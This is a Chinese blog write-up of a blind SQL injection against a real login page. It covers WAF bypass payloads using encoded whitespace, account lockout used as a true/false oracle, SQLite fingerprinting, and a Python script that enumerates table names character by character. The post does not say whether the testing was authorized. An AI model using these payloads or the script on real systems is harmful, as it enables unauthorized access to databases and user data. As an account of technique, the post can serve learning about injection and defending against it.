---
title: 一次奇葩的SQL注入经历
date: 2019-06-08 12:00:02
tags:
- mysql注入
categories: 注入

---

一次奇葩的SQL注入经历。

在寻找资产的时候发现了这个奇葩的站，里面有许多坑。

<!--more-->

# 判断注入

输入admin' admin''  时可以发现，加一个单引号会出现"出错提示"

![](/images/hard-sql/1.png)

![](/images/hard-sql/2.png)

302跳转后显示

![](/images/hard-sql/3.png)

一个单引号与两个单引号的返回结果不同，大致可以判断出存在注入。

既然是单引号闭合的，那么可以用and或者or语句进行语句闭合，尝试确定注入的存在。

```
aaaaaa' or ''='
aaaaaa' or 'a'='
```

当尝试这两条语句的时候都返回了出错提示，初步判断存在waf。

尝试使用%0a %0b %0c %0d %09去绕过空格。

```
aaaaaa'%0aor%0a''='---------True
aaaaaa'%0aor%0a'a'='--------False
aaaaaa'%0a--%0a-------------Error  #可能是waf，可能是不支持的注释方法
aaaaaa'%0a%23---------------Error
```

然后可以发现两个请求的结果都是一样的。我们可以想到用户锁定应该是跟用户名有关，之前的测试中进行了弱口令测试，可能会导致锁定，影响注入结果。

经过fuzz得知存在admin，test这两个用户，用户锁定功能仅针对存在的用户进行锁定，不存在的用户是不会出现被锁定的。那么我们只需要改变用户名即可。

![](/images/hard-sql/7.png)

![1559183667469](/images/hard-sql/8.png)

到这里，就一共有3个回显信息：

1）用户名锁定-->true

2）用户名或密码错误-->false

3）出现错误-->error or false

这三种回显中，1)代表真，后面的2) 为假，3)可能为假或语句错误，当不存该表或者该列的时候，语句报错，也就是出错了，就会返回3)，而不是2)。

# 盲注暴力猜解

然后通过true or false跑表名

![](/images/hard-sql/9.png)

sqlmap的字典只能跑出一个表，接着跑字段。

这里需要注意的是，要避免当前表跟webuser表的列名影响，使用别名的方式进行猜解。

使用别名的方式是没有password字段的

![](/images/hard-sql/10.png)

但是不使用别名会有password字段

![](/images/hard-sql/11.png)

到这里都还算正常，接下来就开始不正常了

猜解当前表的密码，无论是那个字符都报错

记住这里，标记flag

![](/images/hard-sql/13.png)

![](/images/hard-sql/14.png)



经过测试发现，"出现错误"主要是由于语句报错的原因造成的，所以还是需要以用户名锁定为真的结果进行布尔盲注。

但是问题又来了，为什么使用substr无法枚举出数据进行比较呢？

问了一位师傅，给出了以下回答

```
第一种可能
select * from 当前用户表 where 5>(select 次数 from 记录登录次数的表 where username='test')  and username='test' and password=''

第二种可能
select * from 当前用户表 join 用户规则表 on id=id where 当前用户表='test' and 当前用户表.password='' and 

第三种可能

$user=(select * from 当前用户表 where username='')
$登录次数=（select * from 次数表 where username=''）
……
一些判断或操作
最后才是登录
```

现在仍未知道是什么数据库，没有常见四大数据库函数，无法判断数据库类型。

还有不使用别名进行猜解，也能出来结果，按理说报字段不明确，但是

![](/images/hard-sql/15.png)

a开头报错

![](/images/hard-sql/17.png)

通过like可以爆出username。

# 理性分析

1.如果webuser不是当前表，那么select username from webuser应该会爆字段不明确，正确写法应该是select webuser.username from webuser才对。

2.当我指定为webuser.username

![](/images/hard-sql/18.png)

显示也可以注入，那么可以推断webuser是当前表?在查询的时候不是跨表查询，所以不会报错，而且webuser.username与username的数据是一致的，因此推断该当前表应该是webuser。

3.找到上文的flag，当前表是有password字段的，但是使用了别名方式查询就没有password字段，说明当前表并没有password字段。

4.大概率注入的点在锁定用户的表，当如果锁定用户的表没有数据，也就是没有用户被锁定的情况下，就算是语句正确，注入成功也会爆false，也就是用户密码错误

判断真假的页面在302跳转后，所以在使用Python的时候会非常不方便，requests、hackhttp都无法获取我想要的数据，只能用burp，但是线程只能调为1，且要勾上跳转

![](/images/hard-sql/19.png)

知道密码不在当前表后，再执着密码已经没有意义了，我们可以尝试其他字段，比如sessionid，尝试是否可以使用sessionid进行登录。

好不容易注出来了，结果还是登录不进系统，应该还是有其他的判断，并不能伪造session登录系统，**无能狂怒1.0**。

# 确定数据库

师傅弄了个数据库类型分析小工具，找了一些数据库内置函数，通过内置函数分析当前数据库类型。其实通过cookie也能猜出当前数据库，cookie中包含了django language。sqlite绑定了许多语言，python就是其中一种。

![](/images/hard-sql/20.png)

通过特有函数与表的判断如：sqlite_version、sqlite_master，判断出了当前数据库为sqlite。

知道数据库类型之后就好办了，使用特定语句即可

猜表

```sqlite
select substr(tbl_name,0,1) from sqlite_master limit 0,1)='A'
```

简单写了个脚本跑，但是要注意的事，这个站很坑，线程必须1，必须要延时，不能过快，否则会抽风。抽风的情况就是不返回用户被锁定或者用户名密码错误，无法判断真假。

脚本还需要注意的就是：

1)由于网站是https的，必须要先下载该网站的证书，通过verify加载才可以正常访问

2)allow_redirects=True，允许跳转，否则只能捕获到302的包

3)sqlite区分大小写，所以要将大写也列入payload中

4)encode('utf-8')处理中文，否则type为unincode，无法匹配到中文

5)延时0.6秒

脚本遍历limit就行，不再写一个循环的原因还是因为抽风的存在，就算是延时2秒也不能保证不会抽风。还有就是用户锁定时长大概是5-10分钟，具体没有去计。过了时间之后还得继续让一个用户锁定，所以只能手动改猜第几个表。

```python
#coding=utf-8
import requests
import time

url = "https://f4ckyouthewebsite/usrlgin?pass=1&username=fuckyou"
s = requests.Session()
data = ""
payloads = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')

for x in range(25):
    for payload in payloads:
    	uri = "%27%0aor%0a(select%0asubstr(tbl_name,"+str(x)+",1)%0afrom%0asqlite_master%0alimit%0a0,1)='"+payload+"'%0aor%0a%271%27=%27&getLock=t&ptype=0&overrideLock=&orl=&password=test123"
        res = s.get(url+uri,verify='4444.cer',allow_redirects=True).text
        res = res.encode('utf-8')
        if "用户被锁定" in res:
            print payload
            data += payload
            break
        time.sleep(0.6)
        print "[in processing]:"+data
```

于是拿到用户表，其中发现存在userblacklist的表，那就与推测一致了，会先查询该表是否有数据，如果没有数据直接就跳到密码验证。

师傅叫我先跑密码，我没有听。我觉得不用操之过急，先把表名跑完了再跑密码也不迟。

晚上11:30，漏洞修复。

**无能狂怒2.0**

给出密码猜解的方法，弄了好久，才发现是被修复了，并不是语句有问题。

sqlite查询sql的值来得出字段的，里面的数据类似于创建语句如:CREATE TABLE....

```sqlite
select (SELECT substr(sql,1,1) FROM sqlite_master WHERE type!='meta' AND name='demo')='C'

SELECT(SELECT substr(sql,1,1) FROM sqlite_master WHERE type!='meta' AND name='demo') like 'C'

SELECT substr(sql,1,1) FROM sqlite_master WHERE type='table' limit 0,1

SELECT sql FROM sqlite_master where name = 'demo'
```

# 小结

这次注入虽然没能有好的收获，但是也学习到不少知识。